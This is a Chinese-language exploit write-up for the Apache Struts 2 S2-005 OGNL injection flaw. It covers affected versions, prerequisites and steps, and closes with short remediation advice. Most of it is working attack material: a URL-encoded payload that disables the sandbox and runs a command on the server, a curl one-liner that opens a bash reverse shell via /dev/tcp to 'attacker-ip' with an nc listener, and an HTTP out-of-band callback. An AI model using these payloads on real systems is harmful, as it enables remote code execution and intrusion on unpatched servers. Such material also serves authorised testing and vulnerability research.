## 漏洞描述

S2-005 漏洞源于 S2-003（受影响版本: 低于 Struts 2.0.12），struts2 会将 http 的每个参数名解析为 OGNL 语句执行。OGNL 表达式通过 # 来访问 struts 的对象，struts 框架通过过滤 # 字符防止安全问题，然而通过 unicode 编码(\\u0023) 或 8 进制(\\43) 即绕过了安全限制。官方对 S2-003 的修复方法是增加了安全模式（沙盒），S2-005 在 OGNL 表达式中将安全模式关闭，又绕过了修复方法。

## 影响版本

- Apache Struts 2.0.0 - 2.1.8.1

## 前置条件

- 无需认证
- 可发送 HTTP 请求到目标

## 利用步骤

1. 发送带有 OGNL 表达式的参数
2. 绕过 # 字符过滤（使用 \\u0023 或 \\43）
3. 关闭沙盒执行命令

## Payload

```http
GET /example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023_context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1 HTTP/1.1
Host: target:8080
```

## 验证方法

```bash
# 此漏洞为OGNL注入RCE，需要使用反弹shell或HTTP外带验证
# 攻击者服务器启动监听
nc -lvp 4444

# 使用反弹shell payload（URL编码）
curl "http://target:8080/example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023_context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fattacker-ip%2F4444%200%3E%261%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1"

# 或使用HTTP外带验证（推荐，攻击者服务器启动: python3 -m http.server 8080）
# 修改命令为: curl http://attacker-ip:8080/whoami
# 检查HTTP服务器日志是否有回连
```

## 修复建议

1. 升级 Apache Struts 至 2.2.0+
2. 禁止或限制动态方法调用
3. 对请求参数进行严格过滤
